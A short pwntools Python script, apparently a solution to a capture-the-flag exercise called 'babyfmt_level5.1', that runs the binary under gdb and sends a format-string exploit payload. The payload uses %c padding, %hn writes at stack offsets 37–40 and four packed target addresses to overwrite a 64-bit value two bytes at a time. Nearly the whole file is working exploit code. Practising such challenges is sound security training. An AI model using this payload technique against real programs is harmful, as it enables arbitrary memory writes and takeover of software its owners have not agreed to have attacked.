from pwn import * 

binary = './babyfmt_level5.1'

p = process(binary)

s = '''
b * printf
b * main+264
'''



gdb.attach(p, s)

# 0x   c8c5   6078  8cd2  5937


payload = flat(
	"%22839c%37$hn",
	"%13211c%3",
	"8$hn%541",
	"82c%39$h",
	"n%26701c",
	"%40$hn-----",
	"\x38\x41\x40\x00\x00\x00\x00\x00",
	"\x3a\x41\x40\x00\x00\x00\x00\x00",
	"\x3c\x41\x40\x00\x00\x00\x00\x00",
	"\x3e\x41\x40\x00\x00\x00\x00\x00"

)
p.sendline(payload)





p.interactive()
